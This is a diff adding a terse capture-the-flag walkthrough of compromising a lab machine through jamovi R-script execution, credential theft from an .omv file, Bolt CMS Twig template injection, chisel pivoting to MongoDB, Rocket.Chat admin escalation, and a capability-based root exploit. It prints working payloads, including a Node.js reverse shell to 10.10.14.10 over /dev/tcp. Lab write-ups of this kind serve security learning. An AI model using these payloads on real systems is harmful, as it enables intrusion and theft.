@@ -1,0 +1,62 @@
+we found 5 ports open. on the port 80 page we found a button that redirects us to port 3000 a rocket chat app
+
+we created a aoount and logged in .. but nothing else to do there.
+
+so we checked other ports .. port 8000 ==jamovi== had ==R script== running so we used it to get a shell
+
+Rj editor
+
+```
+system("id",itern=TRUE)
+```
+
+it was a ==docker==
+
+we found .omv file in /root and it got creds for 3 users
+
+we tar -xvf it and in xdat.json file it had creds
+
+on port 80 there was ==bolt cms== running so we tried all creds + with username admin
+
+and got a hit
+
+in File System-> we found config/config.yaml file we put ==TEST STVRAT== and ==cleared the cache== (there was an option)
+
+and it was visible on main site
+
+so on theme editor we found ==index.twig== file and we edited it
+
+`{{['id']|filter('system')}}`  and got shell
+
+we did ssh on 172.17.0.1 via bolt and got ssh  --- user.txt
+
+now we ==checked all ports and ip== .. ip 172.17.0.2 had a hit and port 27017 had a hit
+
+so we used chisel and fowarded this port ..and now  typed ==mongo== and it automatically connected to that port on out pc
+
+```
+show databases
+use meteor
+db.getCollectionNames()
+db.users.find()
+now we can update out user to admin 
+db.users.update({"_id": "D2ze5944wkr99XKoj"}, { $set: { "roles" : ["admin"]}})
+```
+
+user updated to admin
+
+now we can use admin fetures like ==incoming web hooks==  and when we curl the link (provided) we got root shell --docker
+
+```
+const require = console.log.constructor('return process.mainModule.require')();
+const { exec } = require('child_process');
+exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.10/5555 0>&1"');
+```
+
+or we can use node.js payload
+
+we used  ==deepce.sh== and it said ==cap_dac_read_search== vuln.
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
+
+we can ==edit /etc/passwd== and got root
